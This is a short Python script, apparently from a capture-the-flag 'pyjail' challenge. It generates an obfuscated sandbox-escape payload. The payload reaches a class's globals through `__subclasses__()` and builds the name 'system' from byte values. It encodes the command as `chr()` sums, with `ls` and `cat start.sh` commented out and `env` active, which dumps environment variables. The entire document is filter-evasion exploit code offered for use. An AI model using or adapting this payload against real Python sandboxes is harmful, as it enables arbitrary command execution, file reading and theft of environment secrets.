# s = "ls"
# s = "cat start.sh"
s = "env"
exp = ""
for i in range(len(s)):
    exp += f"chr({ord(s[i])})+"
print(f"[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()](({exp[:-1]})).decode()")